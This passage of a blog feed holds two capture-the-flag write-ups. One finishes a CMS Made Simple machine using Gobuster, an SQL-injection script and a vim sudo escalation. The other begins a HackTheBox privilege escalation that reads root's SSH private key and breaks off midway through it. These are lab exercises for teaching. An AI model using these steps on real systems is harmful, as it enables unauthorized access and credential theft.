+srcset="https://hushkat.github.io/p/simplectf/website_hu9464286092775566823.png 480w, https://hushkat.github.io/p/simplectf/website_hu13735766564153080760.png 1024w"
+loading="lazy"
+alt="apache"
+class="gallery-image"
+data-flex-grow="247"
+data-flex-basis="594px"
+>&lt;/p>
+&lt;p>There is not much going on here so I decided to brute force the target&amp;rsquo;s website to see if I can find other web pages that might be helpful in this quest. For this, I use &lt;a class="link" href="https://en.wikipedia.org/wiki/Gobuster" target="_blank" rel="noopener"
+>Gobuster&lt;/a> using this command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">gobuster dir -u http://10.10.64.42:80 -w /usr/share/wordlists/directory-list-2.3-small.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here are the results from the brute force attack:
+&lt;img src="https://hushkat.github.io/p/simplectf/gobuster.png"
+width="587"
+height="388"
+srcset="https://hushkat.github.io/p/simplectf/gobuster_hu6855201962006906557.png 480w, https://hushkat.github.io/p/simplectf/gobuster_hu14448011310243076717.png 1024w"
+loading="lazy"
+alt="gobuster"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="363px"
+>&lt;/p>
+&lt;p>We discover a directory &lt;em>/simple&lt;/em> that we now visit on the browser and find this:
+&lt;img src="https://hushkat.github.io/p/simplectf/website-simple.png"
+width="1366"
+height="550"
+srcset="https://hushkat.github.io/p/simplectf/website-simple_hu8276637217836940552.png 480w, https://hushkat.github.io/p/simplectf/website-simple_hu2677722812758154988.png 1024w"
+loading="lazy"
+alt="website-simple"
+class="gallery-image"
+data-flex-grow="248"
+data-flex-basis="596px"
+>
+When we scroll down to the footer of the webpage, we find something interesting:
+&lt;img src="https://hushkat.github.io/p/simplectf/website-footer.png"
+width="1163"
+height="253"
+srcset="https://hushkat.github.io/p/simplectf/website-footer_hu4022532982380505735.png 480w, https://hushkat.github.io/p/simplectf/website-footer_hu16567824872642488471.png 1024w"
+loading="lazy"
+alt="website-footer"
+class="gallery-image"
+data-flex-grow="459"
+data-flex-basis="1103px"
+>
+What comes to sight is the version number of the tool that was used to build this website. So I run a quick Google search about its vulnerabilities and possible exploits. It is discovered that CMS Made simple version 2.2.10 and below are vulnerable to SQL Injection. I found a good Python script that can be used to exploit this vulnerability &lt;a class="link" href="https://gist.github.com/kriss-u/321f0418778697e2ec919f04664ceb4b" target="_blank" rel="noopener"
+>here&lt;/a>.&lt;/p>
+&lt;p>I download the script and try to run it to see its usage:
+&lt;img src="https://hushkat.github.io/p/simplectf/exploit.png"
+width="585"
+height="390"
+srcset="https://hushkat.github.io/p/simplectf/exploit_hu1411204553333355899.png 480w, https://hushkat.github.io/p/simplectf/exploit_hu7594895834032728074.png 1024w"
+loading="lazy"
+alt="exploit"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="360px"
+>.&lt;/p>
+&lt;p>After seeing its usage, we can now decide the syntax to use for the exploit to work on the target depending on our needs. so we use the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">python3 cmsexploit.py -u http://10.10.64.42:80 --crack -w /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After running for a while we get the following output as shown below, and it contains:&lt;/p>
+&lt;ul>
+&lt;li>The salt for the password some identified user&lt;/li>
+&lt;li>The user&amp;rsquo;s username&lt;/li>
+&lt;li>Their email address&lt;/li>
+&lt;li>Hashed password&lt;/li>
+&lt;li>The cracked password&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://hushkat.github.io/p/simplectf/cracked-password.png"
+width="587"
+height="384"
+srcset="https://hushkat.github.io/p/simplectf/cracked-password_hu7127840276280196896.png 480w, https://hushkat.github.io/p/simplectf/cracked-password_hu12715217755113741403.png 1024w"
+loading="lazy"
+alt="exploited"
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="366px"
+>&lt;/p>
+&lt;p>Now that we have some credentials let&amp;rsquo;s try them out on another service that we found running on the target &lt;strong>SSH&lt;/strong>. The command for logging in on ssh using the username and password that we found is:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ssh mitch@10.10.64.42 -p2222
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then type yes and accept to proceed and provide the acquired password. A successful login should land you at a terminal like this:&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/simplectf/ssh_login.png"
+width="585"
+height="388"
+srcset="https://hushkat.github.io/p/simplectf/ssh_login_hu436655457076897800.png 480w, https://hushkat.github.io/p/simplectf/ssh_login_hu4014861553840122208.png 1024w"
+loading="lazy"
+alt="ssh_login"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="361px"
+>&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Now that we are logged in as Mitch I try to list the contents of his home directory and voila, we capture our first flag which is in the user.txt file.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/simplectf/userflag.png"
+width="585"
+height="391"
+srcset="https://hushkat.github.io/p/simplectf/userflag_hu14528835887931504774.png 480w, https://hushkat.github.io/p/simplectf/userflag_hu9153826645290678400.png 1024w"
+loading="lazy"
+alt="userflag"
+class="gallery-image"
+data-flex-grow="149"
+data-flex-basis="359px"
+>&lt;/p>
+&lt;p>I then try to go back to see if there is any other user on this machine and if I have access to their directory. I found another user &lt;strong>sunbath&lt;/strong> but have no access to his directory. I moved back to another directory and tried to gain access to the root&amp;rsquo;s directory but again, I hit a wall.
+&lt;img src="https://hushkat.github.io/p/simplectf/permission.png"
+width="586"
+height="387"
+srcset="https://hushkat.github.io/p/simplectf/permission_hu7620822677214108421.png 480w, https://hushkat.github.io/p/simplectf/permission_hu8541432378118730111.png 1024w"
+loading="lazy"
+alt="permission"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="363px"
+>&lt;/p>
+&lt;p>I run the command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>to see what permissions Mitch has or what he can run as root without having to provide a password. The results:
+&lt;img src="https://hushkat.github.io/p/simplectf/rootshell.png"
+width="588"
+height="389"
+srcset="https://hushkat.github.io/p/simplectf/rootshell_hu4025918024668027563.png 480w, https://hushkat.github.io/p/simplectf/rootshell_hu6935428685584410311.png 1024w"
+loading="lazy"
+alt="rootshell"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="362px"
+>&lt;/p>
+&lt;p>We gain access to the root shell after finding out that he can access vim as root. To find the custom command to cater to your needs use &lt;a class="link" href="https://gtfobins.github.io/" target="_blank" rel="noopener"
+>this&lt;/a> website. Now that we&amp;rsquo;re root, let&amp;rsquo;s confirm that and see if we have access to the root&amp;rsquo;s directory.&lt;/p>
+&lt;p>&lt;img src="https://hushkat.github.io/p/simplectf/rootflag.png"
+width="586"
+height="390"
+srcset="https://hushkat.github.io/p/simplectf/rootflag_hu9574899870373771047.png 480w, https://hushkat.github.io/p/simplectf/rootflag_hu17196132550477595885.png 1024w"
+loading="lazy"
+alt="rootflag"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="360px"
+>&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging the use of tools and exploits, directory permissions, and sudo privileges, we elevate our access and seize the flags.&lt;/p>
+&lt;p>Remember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.&lt;/p>
+&lt;p>dr0idbot signing off.&lt;/p></description></item><item><title>Privilege Escalation</title><link>https://hushkat.github.io/p/privilege-escalation/</link><pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/privilege-escalation/</guid><description>&lt;img src="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation.jpg" alt="Featured image of post Privilege Escalation" />&lt;p>This image is courtesy of &lt;a class="link" href="https://cyberhoot.com/cybrary/privilege-escalation-attack/" target="_blank" rel="noopener"
+>CyberHoot&lt;/a>&lt;/p>
+&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>After breaching a target&amp;rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="privilege-escalation-challenge">Privilege Escalation Challenge.
+&lt;/h3>&lt;p>Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module &lt;a class="link" href="https://academy.hackthebox.com/course/preview/getting-started" target="_blank" rel="noopener"
+>Getting Started&lt;/a>. The instructions provided are as follows:
+&lt;img src="https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1.jpg"
+width="1021"
+height="300"
+srcset="https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1_hu6869482866601827893.jpg 480w, https://hushkat.github.io/p/privilege-escalation/PrivilegeEscalation1_hu13295729096729830807.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="816px"
+>
+&lt;a class="link" href="https://en.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener"
+>SSH&lt;/a> (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>We begin by using the provided credentials to establish an SSH connection to the target machine:
+If you&amp;rsquo;re following through &lt;strong>Note&lt;/strong> that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.&lt;/p>
+&lt;p>Our first command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">┌──(papab3ar㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh user1@94.237.49.11 -p 31973
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Upon connection, a message about host authenticity appears. Confirm by typing &amp;ldquo;yes&amp;rdquo; and entering the provided password. A successful login grants terminal access:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This system has been minimized by removing packages and content that are
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">not required on a system that users do not log into.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To restore this content, you can run the &amp;#39;unminimize&amp;#39; command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The programs included with the Ubuntu system are free software;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">the exact distribution terms for each program are described in the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">individual files in /usr/share/doc/*/copyright.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">applicable law.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user1 user2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Navigation to user2&amp;rsquo;s directory uncovers the flag.txt file, but access is denied:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat: flag.txt: Permission denied
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The output:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Matching Defaults entries for user1 on
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User user1 may run the following commands on
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> (user2 : user2) NOPASSWD: /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Something interesting shows up here about our users.
+First, we see the text &lt;strong>NOPASSWD&lt;/strong>: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.&lt;/p>
+&lt;p>Then we note the &lt;strong>/bin/bash&lt;/strong>: This is the path to the &amp;ldquo;bash&amp;rdquo; shell executable. Allowing user1 to run &amp;ldquo;/bin/bash&amp;rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.&lt;/p>
+&lt;p>With this in mind, I now want to see if it will work. So I run the following command for user2 as user1:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -u user2 /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From the terminal, this seems to have worked since the CLI switched from:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>to this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Notice that we now have user2 access. So, once again, we try to read the &lt;em>flag.txt&lt;/em> file and manage to get the flag.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTB{l473r4l_********_**_*******_u53r}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ah great, so what, are we done? Or is there more we could do here? We have further instructions:
+&lt;img src="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0.jpg"
+width="1026"
+height="58"
+srcset="https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0_hu7155434506315083472.jpg 480w, https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation0_hu8725563002238112223.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="1768"
+data-flex-basis="4245px"
+>
+Now we try to see if we can be the &lt;strong>root&lt;/strong> user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd ../../
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I list all directories and this is the output I get:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. .. .bash_history .bashrc .profile .ssh .viminfo flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see here, we have our &lt;em>flag.txt&lt;/em> file. I&amp;rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,&lt;strong>.ssh&lt;/strong>. So I navigate to it and list its contents.&lt;/p>
+&lt;p>The &lt;strong>.ssh&lt;/strong> folder in a user&amp;rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.&lt;/p>
+&lt;p>&lt;strong>authorized_keys&lt;/strong>: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client&amp;rsquo;s public key matches any of the keys listed in this file. If there&amp;rsquo;s a match, the client is granted access without needing to enter a password.&lt;/p>
+&lt;p>&lt;strong>id_rsa&lt;/strong>: A private key file for the user&amp;rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.&lt;/p>
+&lt;p>&lt;strong>id_rsa.pub&lt;/strong>: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user&amp;rsquo;s identity during the SSH authentication process.&lt;/p>
+&lt;p>Now it is time to see if we have access to the &lt;strong>id_rsa&lt;/strong> file. If we do, we can use the root user&amp;rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat id_rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
